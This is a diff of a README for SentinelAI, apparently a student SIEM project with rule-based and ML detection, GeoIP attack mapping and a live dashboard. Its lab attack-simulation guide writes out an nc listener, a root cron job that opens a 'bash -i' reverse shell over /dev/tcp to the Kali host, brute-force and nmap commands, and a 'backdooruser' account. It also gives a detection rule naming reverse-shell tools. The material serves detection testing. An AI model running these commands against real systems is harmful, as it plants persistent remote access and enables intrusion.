@@ -1,21 +1,28 @@
 # SentinelAI
 
-A full-stack AI-assisted SIEM (Security Information and Event Management) prototype built as a university cybersecurity project. SentinelAI ingests real Linux logs from a virtual machine, detects attacks using rule-based and ML-based engines, and presents results in a live SOC dashboard.
+A full-stack AI-assisted SIEM (Security Information and Event Management) prototype built as a university cybersecurity project. SentinelAI ingests real Linux logs from a virtual machine, detects attacks using a 14-rule detection engine, correlates alerts into incidents, scores anomalies with ML, and presents everything in a live SOC dashboard with GeoIP-enriched attack mapping.
 
 ---
 
 ## Features
 
-- **Log ingestion** — parses `auth.log`, `syslog`, and custom JSON security logs
-- **8-rule detection engine** — brute force SSH, privilege escalation, sensitive file access, suspicious login time, invalid user enumeration, and more
+- **Live log ingestion** — log agent on Ubuntu VM streams `auth.log` and `syslog` to the SIEM in real time via HTTP POST; WebSocket broadcasts updates to the dashboard instantly
+- **14-rule detection engine** — covers brute force, user enumeration, privilege escalation, port scans, cron backdoors, reverse shells, sudo failures, new account creation, and more
+- **Professional severity tuning** — 4-band severity (Low / Medium / High / Critical) with per-rule score ceilings so the SIEM is never over-sensitive
+- **Cross-session correlation** — detects attack chains that span multiple SSH connections (e.g. brute force in one session → sudo escalation in a later session from the same IP)
 - **Alert correlation** — groups related alerts into incidents using attack-chain pattern matching
 - **ML anomaly scoring** — Isolation Forest trained per-run to flag statistically abnormal sessions
-- **Risk scoring** — final 0–100 score per alert and incident with 4 severity bands (Low / Medium / High / Critical)
-- **FastAPI REST backend** — full CRUD endpoints for events, alerts, incidents, and dashboard stats
+- **Risk scoring** — final 0–100 score per alert and incident combining base score + anomaly bonus + correlation bonus
+- **GeoIP enrichment** — every source IP resolved to country + city via `ip-api.com` with in-memory caching; flag emoji and city shown in Alerts and Incidents tables
+- **Attack Map** — live world map showing attacker source IPs as colour-coded dots (Critical = red, High = orange, Medium = yellow, Low = green) with a summary table below
+- **Duplicate event suppression** — within-batch deduplication prevents the same log line from being processed multiple times
+- **FastAPI REST backend** — full CRUD endpoints for events, alerts, incidents, dashboard stats, and GeoIP
 - **JWT authentication** — register/login with bcrypt password hashing; first user auto-assigned admin role
 - **Role-based access** — `admin` (full access) and `analyst` (read + update incidents)
-- **React SOC dashboard** — Overview, Incidents, Alerts, and Events pages with live filtering
-- **Real attack data** — logs collected from a Kali Linux → Ubuntu VM attack simulation (Hydra brute force, nmap, sensitive file access)
+- **Rule suppression** — admins can suppress noisy rules directly from the Alerts page
+- **Incident management** — assign incidents, add notes, update status, export PDF incident reports
+- **Email alerting** — High and Critical incidents trigger email notifications via SMTP
+- **React SOC dashboard** — Overview, Incidents, Alerts, Events, Attack Map pages with live filtering and CSV export
 - **137 unit tests** — covering correlation, risk scoring, and anomaly scoring modules
 
 ---
@@ -30,14 +37,16 @@ sentinelai/
 │   ├── auth.py                  # JWT + bcrypt auth, user CRUD
 │   ├── collector.py             # Reads log files, dispatches to parsers
 │   ├── parser_auth.py           # Parses /var/log/auth.log
-│   ├── parser_syslog.py         # Parses /var/log/syslog
+│   ├── parser_syslog.py         # Parses /var/log/syslog (UFW, cron, syslog)
 │   ├── parser_custom.py         # Parses custom_security.log (JSON)
 │   ├── normalizer.py            # build_event() — common event schema
 │   ├── aggregator.py            # Groups events into sessions by IP/user/time
-│   ├── detection.py             # 8-rule detection engine
+│   ├── detection.py             # 14-rule detection engine
 │   ├── correlation.py           # Links alerts into incidents (7 patterns)
 │   ├── anomaly_scoring.py       # Isolation Forest ML scoring
-│   ├── risk_scoring.py          # Final 0–100 risk score + severity
+│   ├── risk_scoring.py          # Final 0–100 risk score + severity + ceilings
+│   ├── geoip.py                 # GeoIP lookup via ip-api.com with cache
+│   ├── emailer.py               # SMTP email alerts for High/Critical incidents
 │   ├── storage.py               # SQLite database layer
 │   ├── schemas.py               # Pydantic API models
 │   ├── utils.py                 # Shared utilities
@@ -45,8 +54,10 @@ sentinelai/
 │       ├── auth.py              # /api/auth — register, login, me, users
 │       ├── dashboard.py         # /api/dashboard — summary, charts
 │       ├── events.py            # /api/events
-│       ├── alerts.py            # /api/alerts
-│       └── incidents.py         # /api/incidents
+│       ├── alerts.py            # /api/alerts + rule suppression
+│       ├── incidents.py         # /api/incidents + notes + assignment
+│       ├── geoip.py             # /api/geoip — lookup, bulk, attack map IPs
+│       └── live.py              # /api/live/ingest (POST) + /api/live/ws (WS)
 ├── frontend/
 │   └── dashboard/               # Vite + React + Tailwind CSS
 │       └── src/
@@ -56,9 +67,11 @@ sentinelai/
 │               ├── Login.jsx
 │               ├── Register.jsx
 │               ├── Overview.jsx
-│               ├── Incidents.jsx
-│               ├── Alerts.jsx
-│               └── Events.jsx
+│               ├── Incidents.jsx        # GeoIP flag + city in Source IP column
+│               ├── Alerts.jsx           # GeoIP flag + city, rule suppression
+│               ├── Events.jsx
+│               ├── AttackMap.jsx        # Live world map + attacker table
+│               └── IncidentReport.jsx   # PDF-printable incident report
 ├── database/                    # sentinelai.db (auto-created on startup)
 ├── data/logs/                   # Log files from Ubuntu VM
 │   ├── auth.log                 # Real SSH attack logs from Kali→Ubuntu
@@ -66,7 +79,7 @@ sentinelai/
 │   └── custom_security.log      # Custom JSON security events
 ├── models/                      # Trained Isolation Forest model (.pkl)
 ├── scripts/
-│   ├── run_pipeline.py          # Main pipeline: collect → detect → store
+│   ├── run_pipeline.py          # Batch pipeline: collect → detect → store
 │   └── test_auth.py             # Auth endpoint validation script
 └── tests/
     ├── test_correlation.py      # 22 tests
@@ -107,12 +120,32 @@ npm run dev
 # Opens at http://localhost:5173
 ```
 
-### Ingest logs and populate the dashboard
+### Ingest logs from file (batch mode)
 
 ```bash
 # From the project root
 python scripts/run_pipeline.py --reset
 ```
+
+---
+
+## Live Ingestion (Real-time mode)
+
+A log agent runs on the Ubuntu VM and streams logs to the SIEM as they are written. The dashboard updates in real time via WebSocket.
+
+### Log agent setup on Ubuntu VM
+
+The agent reads `/var/log/auth.log` and `/var/log/syslog` using `tail -F` and POSTs new lines to the SIEM every few seconds:
+
+```bash
+# On Ubuntu VM — install the agent dependencies
+pip3 install requests
+
+# Run the agent (replace SIEM_IP with your Windows machine IP)
+python3 log_agent.py --host http://<SIEM_IP>:8000
+```
+
+The live feed is visible in real time on the **Overview** page under **Live Event Feed**.
 
 ---
 
@@ -137,31 +170,92 @@ python -m pytest tests/ -v
 
 ---
 
-## Log Collection from VM
+## Detection Rules
 
-The included `auth.log` and `syslog` were collected from a real Kali→Ubuntu attack simulation:
+| Rule | Severity | Trigger condition |
+|------|----------|-------------------|
+| `reverse_shell_cron` | 🔴 Critical | Cron job executes a command with `/dev/tcp`, `bash -i`, `nc`, `mkfifo`, etc. |
+| `success_after_failures` | 🔴 Critical | Successful SSH login after ≥5 failed attempts from same IP (cross-session) |
+| `sudo_after_suspicious_login` | 🔴 Critical | Sudo used from an IP that had prior brute-force failures (cross-session) |
+| `privilege_after_login` | 🔴 Critical | Sudo executed in the same session as a successful SSH login |
+| `new_user_created` | 🟠 High | `useradd` / `adduser` executed via sudo |
+| `cron_modification` | 🟠 High | Cron schedule edited via sudo |
+| `brute_force_ssh` | 🟠 High | ≥5 wrong-password failures on a real username from same IP |
+| `repeated_sudo_failures` | 🟠 High | ≥5 sudo authentication failures |
+| `port_scan_detected` | 🟠 High | ≥10 distinct UFW-blocked ports from same IP |
+| `sensitive_file_access` | 🟠 High | Custom security log events (file access, sensitive commands) |
+| `invalid_user_enumeration` | 🟡 Medium | ≥4 SSH attempts with non-existent usernames from same IP (cross-session) |
+| `suspicious_login_time` | 🟡 Medium | SSH login activity between 22:00 – 06:00 |
+| `system_service_anomaly` | 🟢 Low | Service failures or kernel errors in syslog |
+| `ssh_login_success` | 🟢 Low | Any successful SSH login (informational) |
 
-| Attack | Tool | Log evidence |
-|--------|------|-------------|
-| SSH brute force | Hydra | 500+ `Failed password` entries from `192.168.56.128` |
-| User enumeration | manual SSH loop | `Invalid user` entries for admin, root, oracle, pi, ubuntu |
-| Port scan | nmap | Connection events in syslog |
-| Successful login + file access | SSH + shell | `Accepted password` + `/etc/passwd` read |
+### Score ceilings
 
-To collect fresh logs from your own VM:
+Certain rules are hard-capped so ML anomaly bonuses cannot escalate them into a higher severity band:
+
+| Rule | Max score | Reason |
+|------|-----------|--------|
+| `ssh_login_success` | 29 (Low) | Informational only |
+| `system_service_anomaly` | 29 (Low) | Background noise |
+| `suspicious_login_time` | 59 (Medium) | Reconnaissance indicator |
+| `invalid_user_enumeration` | 59 (Medium) | Reconnaissance indicator |
+| `port_scan_detected` | 79 (High) | Real threat, not confirmed compromise |
+| `repeated_sudo_failures` | 79 (High) | Real threat, not confirmed compromise |
+
+---
+
+## Attack Simulation Guide (Kali → Ubuntu)
+
+Replace `yourpassword` with your Ubuntu account password. Ubuntu IP: `192.168.56.130`.
+
+| Step | Command (on Kali) | Expected alert | Severity |
+|------|-------------------|----------------|----------|
+| 1 | `ssh majeed@192.168.56.130` (correct password) | `ssh_login_success` | 🟢 Low |
+| 2 | `ssh fakeuser1-4@192.168.56.130` (4 different fake users) | `invalid_user_enumeration` | 🟡 Medium |
+| 3 | 5× `sshpass -p wrongpass ssh majeed@192.168.56.130` | `brute_force_ssh` | 🟠 High |
+| 4 | `nmap -sS -p 1-1000 192.168.56.130` | `port_scan_detected` | 🟠 High |
+| 5 | SSH in + 5× `echo x \| sudo -S id` | `repeated_sudo_failures` | 🟠 High |
+| 6 | SSH in + `sudo useradd -m backdooruser` | `new_user_created` | 🟠 High |
+| 7 | 5× wrong SSH then correct SSH login | `success_after_failures` | 🔴 Critical |
+| 8 | SSH in + `sudo whoami` (after prior failures) | `privilege_after_login` | 🔴 Critical |
+| 9 | Add cron job with `bash -i >& /dev/tcp/...` on Ubuntu | `reverse_shell_cron` | 🔴 Critical |
+
+### Reverse shell demo (step 9 detail)
 
 ```bash
-# On Ubuntu VM — copy logs to a readable location
-sudo cp /var/log/auth.log /tmp/auth.log
-sudo cp /var/log/syslog /tmp/syslog
-sudo chmod 644 /tmp/auth.log /tmp/syslog
+# On Kali — start listener
+nc -lvnp 4444
 
-# On Kali — SCP to project
-scp testuser@<UBUNTU_IP>:/tmp/auth.log data/logs/auth.log
-scp testuser@<UBUNTU_IP>:/tmp/syslog   data/logs/syslog
+# On Ubuntu — plant backdoor cron
+sudo bash -c 'echo "* * * * * root bash -i >& /dev/tcp/192.168.56.128/4444 0>&1" > /etc/cron.d/demo_rev'
+# Wait 60 seconds — Ubuntu connects back to Kali listener
+# SentinelAI fires Critical reverse_shell_cron alert
 
-# Re-run pipeline
-python scripts/run_pipeline.py --reset
+# Cleanup
+sudo rm /etc/cron.d/demo_rev
+```
+
+---
+
+## GeoIP & Attack Map
+
+- Every alert's source IP is resolved to country and city using `ip-api.com` (free tier, cached in memory)
+- Country flag emoji and city are shown in the **Alerts** and **Incidents** tables
+- The **Attack Map** page shows a live SVG world map with colour-coded dots per attacker IP
+- Private/LAN IPs (e.g. `192.168.x.x`) are displayed with a 🏠 home icon and labelled as `LAN`
+
+---
+
+## Email Alerting
+
+Set these environment variables before starting the backend to enable email alerts for High and Critical incidents:
+
+```bash
+SMTP_HOST=smtp.gmail.com
+SMTP_PORT=587
+SMTP_USER=your@gmail.com
+SMTP_PASS=your_app_password
+ALERT_EMAILS=soc@yourorg.com,analyst@yourorg.com
 ```
 
 ---
@@ -171,23 +265,12 @@ python scripts/run_pipeline.py --reset
 | Feature | Analyst | Admin |
 |---------|---------|-------|
 | View dashboard, alerts, events, incidents | ✅ | ✅ |
-| Update incident status | ✅ | ✅ |
-| View all users (`GET /api/auth/users`) | ❌ | ✅ |
-
----
-
-## Detection Rules
-
-| Rule | Trigger |
-|------|---------|
-| `brute_force_ssh` | 5+ failed SSH logins from same IP |
-| `invalid_user_enumeration` | 3+ invalid user attempts |
-| `success_after_failures` | Successful login after multiple failures |
-| `sudo_after_suspicious_login` | sudo usage after suspicious login |
-| `privilege_after_login` | Privilege escalation post-login |
-| `sensitive_file_access` | Access to `/etc/passwd`, `/etc/shadow`, `/root` etc. |
-| `suspicious_login_time` | Successful login outside 07:00–20:00 |
-| `system_service_anomaly` | Service failures / kernel errors in syslog |
+| Update incident status, add notes | ✅ | ✅ |
+| Assign incidents | ✅ | ✅ |
+| Export incident PDF report | ✅ | ✅ |
+| Suppress detection rules | ❌ | ✅ |
+| View all users | ❌ | ✅ |
+| Manage user accounts | ❌ | ✅ |
 
 ---
 
@@ -195,8 +278,10 @@ python scripts/run_pipeline.py --reset
 
 | Layer | Technology |
 |-------|-----------|
-| Backend | Python, FastAPI, SQLite, scikit-learn |
+| Backend | Python 3.10+, FastAPI, SQLite |
 | Auth | JWT (python-jose), bcrypt (passlib) |
-| ML | Isolation Forest (sklearn), StandardScaler |
-| Frontend | React, Vite, Tailwind CSS, Recharts, Lucide |
+| ML | Isolation Forest (scikit-learn), StandardScaler |
+| GeoIP | ip-api.com (HTTP, in-memory cache) |
+| Frontend | React 18, Vite, Tailwind CSS, Recharts, Lucide |
+| Real-time | WebSocket (FastAPI), log agent (`tail -F` + HTTP POST) |
 | Testing | pytest (137 tests) |
